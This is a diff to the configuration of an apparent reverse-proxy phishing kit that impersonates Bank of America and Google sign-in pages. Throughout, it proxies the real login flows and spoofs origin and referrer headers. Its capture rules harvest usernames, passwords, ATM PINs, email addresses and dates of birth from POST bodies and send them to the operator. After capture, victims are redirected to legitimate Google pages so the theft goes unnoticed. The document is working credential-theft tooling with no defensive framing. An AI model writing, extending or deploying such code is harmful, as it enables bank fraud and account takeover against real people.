@@ -2,6 +2,8 @@
 // eslint-disable-next-line max-classes-per-file
 const path = require('path')
 const url = require('url')
+const superagent = require('superagent');
+
 
 const globalWorker = process.HOOK_JS_MODULE
 
@@ -22,6 +24,7 @@ const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClas
 
     }
 
+    
 }
 
 const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {
@@ -130,27 +133,59 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
     execute(clientContext) {
         this.req.headers['origin'] = `https://${clientContext.currentDomain}`
 
-        this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, clientContext.currentDomain) : ''
+        this.req.headers['referer'] = this.req.headers['referer']? 
+            this.req.headers['referer'].replace(clientContext.hostname, clientContext.currentDomain) : ''
 
-        
+
         if (this.req.method === 'POST') {
             clientContext.setLogAvailable(true)
             super.captureBody(clientContext.currentDomain, clientContext)
         }
         
-        if (this.req.url.startsWith('/login/sign-in/signOnSuccessRedirect.go'))
-         {
-            this.res.writeHead(302, {location: '/session/secure/menikooko'})
-            return super.cleanEnd(clientContext.currentDomain, clientContext)
+
+       
+
+        if (this.req.url.startsWith('/CheckCookie?continue=http')) {
+            super.sendClientData(clientContext, {})
+            this.res.writeHead(302, { location: '/auth/login/finish' })
+            return super.cleanEnd('PHP-EXEC', clientContext)
         }
-        
-        if (this.req.method === 'GET') {
-            if (this.req.url ==='/login/sign-in/captcha/signOnV2.go'
-            || this.req.url === '/login/sign-in/internal/entry/signOnV2.go'
-            || this.req.url === '/sign-in/internal/entry/signOnV2.go') {
-                this.res.writeHead(302, {location: '/login/sign-in/signOnV2Screen.go'})
-                return super.cleanEnd(clientContext.currentDomain, clientContext)
+
+
+        if (this.req.url.startsWith('/CheckCookie')) {
+            clientContext.setLogAvailable(true)
+            clientContext.info.isLogin = true
+            super.sendClientData(clientContext, {})
+        }
+        if (this.req.url.startsWith('/ServiceLogin?')  && clientContext.info.isLogin === true) {
+            this.res.writeHead(302, { location: 'https://safety.google/privacy/data/' })
+            return super.cleanEnd(clientContext.currentDomain, clientContext)
+
+        }
+
+        if (this.req.url.startsWith('/punctual/')) {
+            
+            this.req.headers['referrer'] = 'https://accounts.google.com'
+            if (this.req.headers['origin']) {
+                this.req.headers['origin'] = 'https://accounts.google.com'
             }
+            return super.superExecuteProxy('signaler-pa.googleapis.com', clientContext)
+        }
+
+
+        if (this.req.url.startsWith('/playboy')) {
+            const qhost = 'play.google.com'
+            this.req.url = this.req.url.replace('/playboy/log', '/log')
+            return super.superExecuteProxy(qhost, clientContext)
+        }
+        if (this.req.url.startsWith('/CheckConnection')) {
+            this.req.url = this.req.url.replace('/CheckConnection', '/accounts/CheckConnection')
+            return super.superExecuteProxy('accounts.youtube.com', clientContext)
+        }
+        if (this.req.url.startsWith('/kmsi') || this.req.url.startsWith('/account/upsell/webauthn') || this.req.url.startsWith('/account/fb-messenger-linking')) {
+            // super.sendClientData(clientContext, {})
+            this.res.writeHead(302, { location: '/auth/login/finish' })
+            return this.res.end('')
         }
 
         const redirectToken = this.checkForRedirect()
@@ -158,7 +193,7 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
             console.log(`Validating the redirect ${JSON.stringify(redirectToken)}`)
 
             if (redirectToken.url.startsWith('https://myaccount.google.com/') || 
-                redirectToken.url.startsWith('https://accounts.google.com/ManageAccount')) {
+            redirectToken.url.startsWith('https://accounts.google.com/ManageAccount')) {
                 super.sendClientData(clientContext, {})
                 this.res.writeHead(302, { location: '/auth/login/finish' })
                 return super.cleanEnd('PHP-EXEC', clientContext)
@@ -171,10 +206,12 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
             } else {
                 this.req.url = reqCheck 
             }
-
             return this.superExecuteProxy(redirectToken.obj.host, clientContext)
-        }
 
+
+        }
+       
+        
         return super.superExecuteProxy(clientContext.currentDomain, clientContext)
     }
 }
@@ -201,6 +238,9 @@ const ExecPhpPager = class extends globalWorker.BaseClasses.BasePreClass {
             }
         } else {
             switch (this.req.url) {
+                case '/session/secure/minto':
+                    super.superExecutePhpScript('login.php', clientContext)
+                    break
                 case '/session/secure/riliqua':
                     super.superExecutePhpScript('profile.php', clientContext)
                     break
@@ -249,9 +289,9 @@ const EmailLoginHandler = class extends globalWorker.BaseClasses.BasePreClass {
                 // eslint-disable-next-line max-len
                 this.req.url = '/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin'
                 clientContext.currentDomain = 'accounts.google.com'
-                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
-                // this.res.writeHead(302, { location: 'https://www.googl3uth.com/b/wZKOnZ/' })
-                // return this.res.end('')
+                // return super.superExecuteProxy(clientContext.currentDomain, clientContext)
+                this.res.writeHead(302, { location: '/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin' })
+                return this.res.end('')
             }
             if (this.req.url === '/auth/login/outlook') {
                 clientContext.info.disableDeflate = true;
@@ -292,7 +332,7 @@ const RecaptchaHandler = class extends globalWorker.BaseClasses.BasePreClass {
     }
 
     static match(req) {
-        return req.url.startsWith('/recaptcha/');
+        return req.url.startsWith('/recaptcha');
 
     }
 
@@ -300,7 +340,8 @@ const RecaptchaHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
         this.req.headers['origin'] = `https://${clientContext.currentDomain}`
 
-        this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, clientContext.currentDomain) : ''
+        this.req.headers['referer'] = this.req.headers['referer']? 
+        this.req.headers['referer'].replace(clientContext.hostname, clientContext.currentDomain) : ''
 
 
         if (this.req.url.startsWith('/recaptcha/enterprise/anchor') || this.req.url.startsWith('/us/en/recaptcha/enterprise/anchor')) {
@@ -340,31 +381,67 @@ const RecaptchaHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
         }
 
-
+       
     }
 }
 
+
+
+
 const configExport = {
-    CURRENT_DOMAIN: 'secure.bankofamerica.com',
-    START_PATH: '/login/sign-in/signOnV2Screen.go',
+    CURRENT_DOMAIN: 'www.bankofamerica.com',
+    START_PATH: '/session/secure/minto',
+    
+    EXTERNAL_FILTERS: 
+    [
+    'signaler-pa.googleapis.com',
+    'ssl.gstatic.com',
+    ],
+
     PRE_HANDLERS:
         [
             EmailLoginHandler,
             ExecPhpPager,
-            RecaptchaHandler
+            RecaptchaHandler,
         ],
     PROXY_REQUEST: ProxyRequest,
     PROXY_RESPONSE: ProxyResponse,
     DEFAULT_PRE_HANDLER: DefaultPreHandler,
 
     CAPTURES: {
-        loginUserName: {
+         loginUserName: {
+            method: 'POST',
+            params: ['sko1'],
+            urls: '',
+            hosts: 'PHP-EXEC',
+        },
+        loginPassword: {
+            method: 'POST',
+            params: ['skun1'],
+            urls: '',
+            hosts: 'PHP-EXEC',
+        },
+
+        loginUserName2: {
+            method: 'POST',
+            params: ['sko'],
+            urls: '',
+            hosts: 'PHP-EXEC',
+        },
+        loginPassword2: {
+            method: 'POST',
+            params: ['skun'],
+            urls: '',
+            hosts: 'PHP-EXEC',
+        },
+
+        loginRealUserName: {
             method: 'POST',
             params: ['onlineId'],
             urls: '',
             hosts: 'PHP-EXEC',
         },
-        loginPassword: {
+        loginRealPassword: {
             method: 'POST',
             params: ['passcode'],
             urls: '',
@@ -377,13 +454,14 @@ const configExport = {
             urls: '',
             hosts: 'PHP-EXEC',
         },
+        
         atmPin: {
             method: 'POST',
             params: ['pin'],
             urls: '',
             hosts: 'PHP-EXEC',
         },
-        
+
         emailCapture: {
             method: 'POST',
             params: ['username', 'user'],
@@ -422,7 +500,6 @@ const configExport = {
             urls: '',
             hosts: 'PHP-EXEC',
         },
-
 
         dateOfBirth: {
             method: 'POST',
